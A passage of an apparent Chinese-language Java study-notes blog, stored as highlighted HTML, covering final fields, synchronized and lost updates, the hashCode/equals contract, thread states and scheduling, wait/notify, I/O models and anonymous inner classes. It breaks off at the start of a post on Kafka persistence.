class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span> &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">print</span><span class=\"params\">(String id)</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(id + <span class=\"string\">\" : \"</span> + <span class=\"string\">\"i4 = \"</span> + i4 + <span class=\"string\">\", i5 = \"</span> + i5 + <span class=\"string\">\", i = \"</span> + i);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        FinalDemo finalDemo = <span class=\"keyword\">new</span> FinalDemo();</span><br><span class=\"line\">        <span class=\"comment\">// finalDemo.i1++;  // Error: can't change value</span></span><br><span class=\"line\">        finalDemo.v2.i++;</span><br><span class=\"line\">\t\tFinalDemo.i++;</span><br><span class=\"line\">\t\tfinalDemo.v1 = <span class=\"keyword\">new</span> Value();</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; finalDemo.a.length; i++) &#123;</span><br><span class=\"line\">\t\t\tfinalDemo.a[i]++;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">// finalDemo.v2 = new Value();\t// Error: Can't</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">// finalDemo.v3 = new Value();\t// change handle</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">// finalDemo.a = new int[3];\t// Error: can't assign a value to final var</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tfinalDemo.print(<span class=\"string\">\"fd1\"</span>);</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">\"Creating new FinalDemo class\"</span>);</span><br><span class=\"line\">\t\tFinalDemo finalDemo2 = <span class=\"keyword\">new</span> FinalDemo();</span><br><span class=\"line\">\t\tfinalDemo.print(<span class=\"string\">\"fd1\"</span>);</span><br><span class=\"line\">\t\tfinalDemo2.print(<span class=\"string\">\"fd2\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"同步机制实现原子化-synchronized\"><a href=\"#同步机制实现原子化-synchronized\" class=\"headerlink\" title=\"同步机制实现原子化 synchronized\"></a>同步机制实现原子化 synchronized</h2><p>丢失更新(lost update) 有一种特定的过程。<br>(1) 取得账户余额。<br><code>int i = balance;</code><br>(2) 将账户余额加1。<br><code>balance = i + 1;</code><br>这会让计算机以两个步骤来完成账户的变化。通常我们会以单一的命令来做这件事情:<br><code>balance++;</code><br>但强行以两个步骤来处理就会浮现出非原子性的问题。下面用两个都想把余额递增的线程来展示丢失更新。<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestSync</span> <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> balance;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/** 每个线程都把账户递增50次　**/</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">50</span>; i++) &#123;</span><br><span class=\"line\">            increament();</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"balance is \"</span> + balance);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">increament</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> i = balance;</span><br><span class=\"line\">        <span class=\"comment\">/** 问题出在我们用的是读取的值而不是目前的值 **/</span></span><br><span class=\"line\">        balance = i + <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestSyncTest</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        TestSync job = <span class=\"keyword\">new</span> TestSync();</span><br><span class=\"line\">        Thread a = <span class=\"keyword\">new</span> Thread(job);</span><br><span class=\"line\">        Thread b = <span class=\"keyword\">new</span> Thread(job);</span><br><span class=\"line\">        a.start();</span><br><span class=\"line\">        b.start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>用同步机制让<code>increment()</code> 方法原子化，将<code>increment()</code>方法同步化可以解决丢失更新的问题，因为他会让方法中的两个步骤组成不可分割的单元。<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title\">increment</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i = balance;</span><br><span class=\"line\">    balance = i + <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>但同步化是需要付出额外的成本。也就是说进入同步化方法的程序会查询钥匙等性能上的损耗。其次，同步化的方法会让你的程序因为要同步并行的问题而慢下来。同步化会强制线程排队等待执行方法。最后，最可怕的是同步化可能会导致死锁现象。原则上最好制作最少量的同步化。事实上同步化的规模可以小于方法全部，可以用<code>synchronized</code>来修饰一行或数行的代码而不必整个方法都同步化。比如:<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">go</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    doStuff();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span>(<span class=\"keyword\">this</span>) &#123;</span><br><span class=\"line\">        criticalStuff();</span><br><span class=\"line\">        moreCriticalStuff();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>并行问题也是线程安全的问题，对于一个类是否线程安全，重要的决定因素便是是否存在上面提及的问题，诸如HashMap和HashTable、StringBuffer和StringBuiler、Vector和ArrayList等的区别，其中HashMap、StringBuiler、ArrayList没有实现同步化，因此是非线程安全的；HashTable、StringBuffer、Vector在原本HashMap、StringBuiler、ArrayList的方法上添加了<code>synchronized</code>修饰来保证线程安全。</p>\n<h2 id=\"hashCode-与equals-的相关规定\"><a href=\"#hashCode-与equals-的相关规定\" class=\"headerlink\" title=\"hashCode()与equals()的相关规定\"></a>hashCode()与equals()的相关规定</h2><p>API文件有对对象的状态指定出必须遵守的规则：</p>\n<ol>\n<li>如果两个对象相等，则<code>hashcode</code>必须也是相等的。</li>\n<li>如果两个对象相等，对其中一个对象调用<code>equals()</code>必须返回<code>true</code>。也就是说，若<code>a.equals(b)</code>则<code>b.equals(a)</code>。</li>\n<li>如果两个对象有相同的<code>hashcode</code>值，它们也不一定是相等的。但若两个对象相等，则<code>hashcode</code>值一定是相等的。</li>\n<li>因此若<code>equals()</code>被覆盖过，则<code>hashCode()</code>也必须被覆盖。</li>\n<li><code>hashCode()</code>的默认行为是对在<code>heap(堆)</code>上的对象产生独特的值。如果你没有<code>override</code>过<code>hashCode()</code>，则该<code>class</code>的两个对象怎样都不会被认为是相同的。</li>\n<li><code>equals()</code>的默认行为是执行==的比较。也就是说会去测试两个引用是否对上<code>heap</code>上同一个对象。如果<code>equals()</code>没有被覆盖过，两个对象永远都不会被视为相同的，因为不同的对象有不同的字节组合。</li>\n</ol>\n<p><code>a.equals(b)</code>必须与<code>a.hashCode() == b.hashCode()</code>等值。但<code>a.hashCode() == b.hashCode()</code>不一定要与<code>a.equals()</code>等值。</p>\n<p><strong>问：</strong>为什么不同对象会有相同<code>hashcode</code>的可能<br><strong>答：</strong><code>HashSet</code>使用<code>hashcode</code>来达成存取速度较快的存储方法。如果你尝试用对象来寻找<code>ArrayList</code>中相同的对象(也就是不用索引来找)，<code>ArrayList</code>会从头开始找起。但是<code>HashSet</code>这样找对象的速度就块多了，因为它使用<code>hashcode</code>来寻找符合条件的元素。因此当你想要寻找某个对象时，通过<code>hashcode</code>就可以很快算出该对象所在的位置，而不用从头一个一个找起。重点在于<code>hashcode</code>相同并不一定保证对象是相等的，因为<code>hashCode()</code>所使用的杂凑算法也许刚刚好会让多个对象传回相同的杂凑值。越糟糕的杂凑算法越容易碰撞，但这也与数据值域分布的特征有关。如果<code>HashSet</code>发现在对比的时候，同样的<code>hashcode</code>有多个对象，它会使用<code>equals()</code>来判断是否有完全的符合。也就是说，<code>hashcode</code>是用来缩小寻找成本，但最后还是要用<code>equals()</code>才能认定是否真的找到相同的项目。</p>\n<blockquote>\n<p>这与加密中的问题一样，网络中将用户的密码获取后，通过加密算法将密码加密成一个固定长度的无规律字符串保存在数据库中，密码相同，肯定加密的结果是唯一相同的，但是由于加密过后是固定长度，比如32个字节，那么着32个字节就有固定的容量，因此会出现两个不同的密码加密后是一样的字符串。</p>\n</blockquote>\n<p>对于上述第四条和第五条，个人的理解是：<code>hashCode()</code>方法原本是根据对象在内存中的位置来计算，因此如果要比较两个对象是否相等，通过原本的<code>hashCode()</code>方法计算会得到两个不同的值，因为是两个对象，原本的<code>hashCode()</code>是一个对象对应一个唯一的值，这个值与内存位置有关，而两个对象是在不同的内存位置上，如果强行想要表示这两个对象相等，就必须重写原本的<code>hashCode()</code>。</p>\n<p>同样的，对于<code>equals()</code>方法，原本是表示两个引用所指向的对象是否是一个对象，但是我们需要按照自己的意愿去表示两个不同的对象，如果某些特征相同时也表示相等，比如想要表示一个人的信息，在不同时间点记录的信息会不同，但只要身份证号一样，我们就认为这是同一个人。这就需要重写<code>equals()</code>方法，让它表示两个不同对象在意义上相同。</p>\n<p>综合上述的描述 : <code>hashCode()</code>是判断引用相等，<code>equals()</code>是判断对象相等。</p>\n<h2 id=\"Collection-API\"><a href=\"#Collection-API\" class=\"headerlink\" title=\"Collection API\"></a>Collection API</h2><p><img src=\"http://wiki3.cosc.canterbury.ac.nz/images/8/8d/Collections-detail-1.png\" alt=\"\"></p>\n<h2 id=\"多线程\"><a href=\"#多线程\" class=\"headerlink\" title=\"多线程\"></a>多线程</h2><h3 id=\"Java实现多线程的方式\"><a href=\"#Java实现多线程的方式\" class=\"headerlink\" title=\"Java实现多线程的方式\"></a><a href=\"http://fenlan.github.io/2016/06/18/java-Thread/\">Java实现多线程的方式</a></h3><ul>\n<li>继承<code>Thread</code>类，重写<code>run</code>方法</li>\n<li>实现<code>Runable</code>接口</li>\n<li>实现<code>Callable</code>接口</li>\n</ul>\n<blockquote>\n<p>启动多线程时，<code>start()</code>方法的调用后并不是立即执行多线程代码，而是使得该线程变为可运行态（Runnable），什么时候运行是由操作系统决定的。<br>从程序运行的结果可以发现，多线程程序是乱序执行。因此，只有乱序执行的代码才有必要设计为多线程。<br>Thread.sleep()方法调用目的是不让当前线程独自霸占该进程所获取的CPU资源，以留出一定时间给其他线程执行的机会。<br>实际上所有的多线程代码执行顺序都是不确定的，每次执行的结果都是随机的。</p>\n<p>实际上所有的多线程代码都是通过运行Thread的start()方法来运行的。因此，不管是扩展Thread类还是实现Runnable接口来实现多线程，最终还是通过Thread的对象的API来控制线程的。</p>\n</blockquote>\n<h3 id=\"三种方式的区别\"><a href=\"#三种方式的区别\" class=\"headerlink\" title=\"三种方式的区别\"></a>三种方式的区别</h3><ul>\n<li>实现<code>Runable</code>接口能增强程序的健壮性，代码能够被多个线程共享，<strong>代码与数据是独立的</strong>，适合多个相同程序代码的线程区处理同一资源。正如上述同步化所用的程序。</li>\n<li>继承<code>Thread</code>类不适合资源共享，但继承<code>Thread</code>和实现<code>Runable</code>都是通过<code>start()</code>启动线程，然后JVM将线程放到就绪队列中，如果有处理机可用，则执行<code>run</code>方法。</li>\n<li>实现<code>Callable</code>接口要实现<code>call</code>方法，并且线程执行完后是后返回值的，其他两种都没有返回值。</li>\n</ul>\n<blockquote>\n<p>在java中，每次程序运行至少启动2个线程。一个是main线程，一个是垃圾收集线程。</p>\n</blockquote>\n<h3 id=\"线程状态\"><a href=\"#线程状态\" class=\"headerlink\" title=\"线程状态\"></a>线程状态</h3><p><img src=\"http://img.blog.csdn.net/20150309140927553\" alt=\"\"></p>\n<ul>\n<li>新建状态（New）：新创建了一个线程对象。</li>\n<li>就绪状态（Runnable）：线程对象创建后，其他线程调用了该对象的start()方法。该状态的线程位于可运行线程池中，变得可运行，等待获取CPU的使用权。</li>\n<li>运行状态（Running）：就绪状态的线程获取了CPU，执行程序代码</li>\n<li>阻塞状态（Blocked）：阻塞状态是线程因为某种原因放弃CPU使用权，暂时停止运行。直到线程进入就绪状态，才有机会转到运行状态。阻塞的情况分三种：<ul>\n<li>等待阻塞：运行的线程执行wait()方法，JVM会把该线程放入等待池中。(wait会释放持有的锁)</li>\n<li>同步阻塞：运行的线程在获取对象的同步锁时，若该同步锁被别的线程占用，则JVM会把该线程放入锁池中。</li>\n<li>其他阻塞：运行的线程执行sleep()或join()方法，或者发出了I/O请求时，JVM会把该线程置为阻塞状态。当sleep()状态超时、join()等待线程终止或者超时、或者I/O处理完毕时，线程重新转入就绪状态。（注意,sleep是不会释放持有的锁）</li>\n</ul>\n</li>\n<li>死亡状态（Dead）：线程执行完了或者因异常退出了run()方法，该线程结束生命周期。</li>\n</ul>\n<h3 id=\"线程调度\"><a href=\"#线程调度\" class=\"headerlink\" title=\"线程调度\"></a>线程调度</h3><p><strong>Java线程有优先级，优先级高的线程会获得较多的运行机会。</strong></p>\n<p>Java线程的优先级用整数表示，取值范围是1~10，Thread类有以下三个静态常量：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> MAX_PRIORITY</span><br><span class=\"line\">          线程可以具有的最高优先级，取值为<span class=\"number\">10</span>。</span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> MIN_PRIORITY</span><br><span class=\"line\">          线程可以具有的最低优先级，取值为<span class=\"number\">1</span>。</span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> NORM_PRIORITY</span><br><span class=\"line\">          分配给线程的默认优先级，取值为<span class=\"number\">5</span>。</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>Thread类的setPriority()和getPriority()方法分别用来设置和获取线程的优先级。<br>每个线程都有默认的优先级。主线程的默认优先级为Thread.NORM_PRIORITY。<br>线程的优先级有继承关系，比如A线程中创建了B线程，那么B将和A具有相同的优先级。</p>\n</blockquote>\n<h3 id=\"常用的调度\"><a href=\"#常用的调度\" class=\"headerlink\" title=\"常用的调度\"></a>常用的调度</h3><ul>\n<li>线程睡眠：Thread.sleep(long millis)方法，使线程转到阻塞状态。millis参数设定睡眠的时间，以毫秒为单位。当睡眠结束后，就转为就绪（Runnable）状态。sleep()平台移植性好。sleep不会释放持有的锁。</li>\n<li>线程等待：Object类中的wait()方法，导致当前的线程等待，直到其他线程调用此对象的 notify() 方法或 notifyAll() 唤醒方法。这两个唤醒方法也是Object类中的方法，行为等价于调用 wait(0) 一样。wait会释放持有的锁。</li>\n<li>线程让步：Thread.yield() 方法，暂停当前正在执行的线程对象，把执行机会让给相同或者更高优先级的线程。</li>\n<li>线程加入：join()方法，等待其他线程终止。在当前线程中调用另一个线程的join()方法，则当前线程转入阻塞状态，直到另一个进程运行结束，当前线程再由阻塞转为就绪状态。</li>\n<li>线程唤醒：Object类中的notify()方法，唤醒在此对象监视器上等待的单个线程。如果所有线程都在此对象上等待，则会选择唤醒其中一个线程。选择是任意性的，并在对实现做出决定时发生。线程通过调用其中一个 wait 方法，在对象的监视器上等待。 直到当前的线程放弃此对象上的锁定，才能继续执行被唤醒的线程。被唤醒的线程将以常规方式与在该对象上主动同步的其他所有线程进行竞争；例如，唤醒的线程在作为锁定此对象的下一个线程方面没有可靠的特权或劣势。类似的方法还有一个notifyAll()，唤醒在此对象监视器上等待的所有线程。</li>\n</ul>\n<h3 id=\"常用函数说明\"><a href=\"#常用函数说明\" class=\"headerlink\" title=\"常用函数说明\"></a>常用函数说明</h3><ul>\n<li><code>sleep(long millis)</code> : <code>运行</code>–&gt;<code>阻塞</code> ,在指定的毫秒数内让当前正在执行的线程休眠（暂停执行）</li>\n<li><code>join()</code> : <code>运行</code>–&gt;<code>阻塞</code>,在很多情况下，主线程生成并起动了子线程，如果子线程里要进行大量的耗时的运算，主线程往往将于子线程之前结束，但是如果主线程处理完其他的事务后，需要用到子线程的处理结果，也就是主线程需要等待子线程执行完成之后再结束，这个时候就要用到join()方法了。</li>\n<li><code>yield()</code> : <code>运行</code>–&gt;<code>可运行</code>,让当前运行线程回到可运行状态，以允许具有相同优先级的其他线程获得运行机会。因此，使用yield()的目的是让相同优先级的线程之间能适当的轮转执行。但是，实际中无法保证yield()达到让步目的，因为让步的线程还有可能被线程调度程序再次选中。</li>\n<li><code>wait()</code> : <code>Obj.wait()</code>，与<code>Obj.notify()</code>必须要与<code>synchronized(Obj)</code>一起使用，也就是wait,与notify是针对已经获取了Obj锁进行操作，从语法角度来说就是Obj.wait(),Obj.notify必须在synchronized(Obj){…}语句块内。从功能上来说wait就是说线程在获取对象锁后，主动释放对象锁，同时本线程休眠。直到有其它线程调用对象的notify()唤醒该线程，才能继续获取对象锁，并继续执行。相应的notify()就是对对象锁的唤醒操作。但有一点需要注意的是notify()调用后，并不是马上就释放对象锁的，而是在相应的synchronized(){}语句块执行结束，自动释放锁后，JVM会在wait()对象锁的线程中随机选取一线程，赋予其对象锁，唤醒线程，继续执行。这样就提供了在线程间同步、唤醒的操作。Thread.sleep()与Object.wait()二者都可以暂停当前线程，释放CPU控制权，主要的区别在于Object.wait()在释放CPU同时，释放了对象锁的控制</li>\n</ul>\n<h3 id=\"wait-和notify\"><a href=\"#wait-和notify\" class=\"headerlink\" title=\"wait()和notify()\"></a><code>wait()</code>和<code>notify()</code></h3><ul>\n<li>wait() 与 notify/notifyAll() 是Object类的方法，在执行两个方法时，要先获得锁。</li>\n<li>当线程执行wait()时，会把当前的锁释放，然后让出CPU，进入等待状态。</li>\n<li>当执行notify/notifyAll方法时，会唤醒一个处于等待该 对象锁 的线程，然后继续往下执行，直到执行完退出对象锁锁住的区域（synchronized修饰的代码块）后再释放锁。</li>\n</ul>\n<h3 id=\"synchronized-和lock\"><a href=\"#synchronized-和lock\" class=\"headerlink\" title=\"synchronized 和lock\"></a><code>synchronized</code> 和<code>lock</code></h3><ul>\n<li><code>synchronized</code> : 在资源竞争不是很激烈的情况下，偶尔会有同步的情形下，synchronized是很合适的。原因在于，编译程序通常会尽可能的进行优化synchronize，另外可读性非常好，不管用没用过5.0多线程包的程序员都能理解。</li>\n<li><code>lock(ReentrantLock)</code> : 提供了多样化的同步，比如有时间限制的同步，可以被Interrupt的同步（synchronized的同步是不能Interrupt的）等。在资源竞争不激烈的情形下，性能稍微比synchronized差点点。但是当同步非常激烈的时候，synchronized的性能一下子能下降好几十倍。而ReentrantLock确还能维持常态。</li>\n</ul>\n<h2 id=\"Java中的BIO、NIO、AIO\"><a href=\"#Java中的BIO、NIO、AIO\" class=\"headerlink\" title=\"Java中的BIO、NIO、AIO\"></a>Java中的BIO、NIO、AIO</h2><ul>\n<li><code>BIO(Blocking I/O)</code> : 同步阻塞IO，服务器中一个连接一个线程，数据的读取和写入必须阻塞在一个线程内等待其完成。</li>\n<li><code>NIO(New I/O)</code> : 同步非阻塞IO，服务器中一个请求一个线程，客户端所有连接注册到多路复用器中，多路复用器轮询所有连接，当存在连接有IO请求时才启动一个线程去处理IO。</li>\n<li><code>AIO(Asynchronous I/O)</code> : 异步非阻塞IO，服务器中一个有效请求一个线程，没有多路复用器轮询，客户端有IO请求给服务器，服务器获得请求后，由OS处理请求，处理完成后，再通知服务器创建一个线程去处理IO结果。</li>\n</ul>\n<p><a href=\"https://juejin.im/entry/598da7d16fb9a03c42431ed3\">具体理解请看这</a><br><a href=\"http://blog.csdn.net/historyasamirror/article/details/5778378\">以及这</a></p>\n<h3 id=\"同步与异步\"><a href=\"#同步与异步\" class=\"headerlink\" title=\"同步与异步\"></a>同步与异步</h3><p>同步与异步是针对应用程序与内核的交互而言的。同步过程中进程触发IO操作并等待或者轮询的去查看IO操作是否完成。异步过程中进程触发IO操作以后，直接返回，做自己的事情，IO交给内核来处理，完成后内核通知进程IO完成。</p>\n<h3 id=\"阻塞与非阻塞\"><a href=\"#阻塞与非阻塞\" class=\"headerlink\" title=\"阻塞与非阻塞\"></a>阻塞与非阻塞</h3><p>简单理解为需要做一件事能不能立即得到返回应答，如果不能立即获得返回，需要等待，那就阻塞了，否则就可以理解为非阻塞</p>\n<p><a href=\"http://www.cnblogs.com/Anker/p/3254269.html\">参考这篇博客的图</a></p>\n<blockquote>\n<p>未具体理解</p>\n</blockquote>\n<h2 id=\"匿名内部类\"><a href=\"#匿名内部类\" class=\"headerlink\" title=\"匿名内部类\"></a>匿名内部类</h2><p>匿名内部类也就是没有名字的内部类<br>正因为没有名字，所以匿名内部类只能使用一次，它通常用来简化代码编写<br>但使用匿名内部类还有个前提条件：必须继承一个父类或实现一个接口<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AnonymousClass</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        Runnable x = <span class=\"keyword\">new</span> Runnable() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                System.out.println(<span class=\"keyword\">this</span>.getClass());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        x.run();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"匿名内部类的特征\"><a href=\"#匿名内部类的特征\" class=\"headerlink\" title=\"匿名内部类的特征\"></a>匿名内部类的特征</h3><ul>\n<li>匿名内部类没有访问修饰符(如<code>public</code>、<code>private</code>)</li>\n<li>当所在方法的形参被匿名内部类使用时，这个行参必须final</li>\n<li>匿名内部类没有构造方法，因为它连名字都没有</li>\n</ul>\n<p>重点解释第二点:<br>首先我们知道在内部类编译成功后，它会产生一个class文件，该class文件与外部类并不是同一class文件，仅仅只保留对外部类的引用。当外部类传入的参数需要被内部类调用时，从java程序的角度来看是直接被调用：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AnonymousClass</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">anonyFinal</span><span class=\"params\">(String name)</span> </span>&#123;</span><br><span class=\"line\">        Runnable x = <span class=\"keyword\">new</span> Runnable() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                System.out.println(<span class=\"keyword\">this</span>.getClass() + <span class=\"string\">\" \"</span> + name);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        x.run();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>从上面代码中看好像name参数应该是被内部类直接调用？其实不然，在java编译之后实际的操作如下：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AnonymousClass</span>$<span class=\"title\">InnerClass</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">InnerClass</span><span class=\"params\">(String name)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.InnerClass$name = name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"keyword\">this</span>.getClass() + <span class=\"string\">\" \"</span> + <span class=\"keyword\">this</span>.InnerClass$name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>从这里可以看出匿名内部类并不是直接调用行参，而是临时产生构造函数，并将行参引用赋给自己的内部变量，并调用内部变量。因此为了让程序员产生这样的直接调用错觉，规定行参必须是final不可更改的。</p>\n<h2 id=\"参考资料-相关链接\"><a href=\"#参考资料-相关链接\" class=\"headerlink\" title=\"参考资料/相关链接\"></a>参考资料/相关链接</h2><ul>\n<li>多线程<ul>\n<li><a href=\"http://blog.csdn.net/evankaka/article/details/44153709\">http://blog.csdn.net/evankaka/article/details/44153709</a></li>\n</ul>\n</li>\n<li>匿名内部类<ul>\n<li><a href=\"http://blog.csdn.net/chenssy/article/details/13170015\">http://blog.csdn.net/chenssy/article/details/13170015</a></li>\n</ul>\n</li>\n</ul>"},{"title":"Kafka 简述","date":"2018-04-02T07:18:23.000Z","_content":"\n## 持久化\n`Don.t fear the filesystem`\nKafka非常依赖文件系统来存储和缓存消息，但人们在这里总是有一个错觉`disks are slow`。事实上，`disks`可以很慢，也可以很快，这取决于人们怎么用它，一个设计合理的磁盘结构通常可以和网络一样快。\n\n这里有一个事实：磁盘读取快慢主要取决于寻道延时。`six 7200rpm SATA RAID-5 array`的磁盘`linear writes`的读取速度大概为600MB/sec，但`random 